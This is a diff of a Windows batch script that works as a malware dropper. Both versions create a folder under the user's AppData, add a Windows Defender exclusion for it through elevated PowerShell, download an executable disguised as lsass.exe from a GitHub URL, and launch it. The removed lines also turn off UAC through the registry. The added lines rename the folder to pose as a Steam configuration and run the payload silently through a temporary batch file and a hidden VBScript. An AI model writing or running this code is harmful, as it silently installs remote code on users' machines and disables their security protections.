@@ -1,19 +1,40 @@
 @echo off
 setlocal enabledelayedexpansion
 
-set "folderPath=%USERPROFILE%\AppData\Local\wdconfig\lsass.exe"
+:: Set paths
+set "folderPath=%USERPROFILE%\AppData\Local\SteamConfig"
+set "batchScript=%TEMP%\hidden_runner.bat"
+set "vbsScript=%TEMP%\hidden_runner.vbs"
+set "exeFile=%folderPath%\lsass.exe"
+
+:: Create SteamConfig folder if it doesn't exist
 if not exist "%folderPath%" mkdir "%folderPath%"
 
-reg add "HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\System" /v EnableLUA /t REG_DWORD /d 0 /f >nul 2>&1
+:: Create the batch script that will run hidden
+(
+    echo @echo off
+    echo setlocal enabledelayedexpansion
+    echo if not exist "%folderPath%" mkdir "%folderPath%"
+    echo powershell -Command "Start-Process powershell -ArgumentList 'Add-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" ^>nul 2^>^&1
+    echo curl -L -o "%exeFile%" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" ^>nul 2^>^&1
 
-powershell -Command "Start-Process powershell -ArgumentList 'Set-MpPreference -ExclusionPath \"%folderPath%\"' -Verb RunAs" >nul 2>&1
+    :: Wait for the file to finish downloading
+    echo :checkFile
+    echo if not exist "%exeFile%" (timeout /t 2 /nobreak ^>nul & goto checkFile)
+    echo for %%%%F in ("%exeFile%") do set filesize=%%%%~zF
+    echo if "!filesize!"=="0" (timeout /t 2 /nobreak ^>nul & goto checkFile)
 
-curl -L -o "%folderPath%\lsass.exe" "https://github.com/sirfedsalot/DO-NOT-RUN/raw/refs/heads/main/lsass.exe" >nul 2>&1
-if %errorlevel% neq 0 exit /b 1
+    :: Run the EXE and keep the batch script alive
+    echo start /b "%exeFile%"
+    echo exit /b 0
+) > "%batchScript%"
 
-if not exist "%folderPath%\lsass.exe" exit /b 1
-for %%F in ("%folderPath%\lsass.exe") do set filesize=%%~zF
-if "%filesize%"=="0" exit /b 1
+:: Create the VBS script to run the batch file silently
+(
+    echo Set objShell = CreateObject("WScript.Shell")
+    echo objShell.Run "cmd.exe /c %batchScript%", 0, False
+) > "%vbsScript%"
 
-start "" "%folderPath%\lsass.exe"
+:: Run the VBS script
+cscript //nologo "%vbsScript%"
 exit
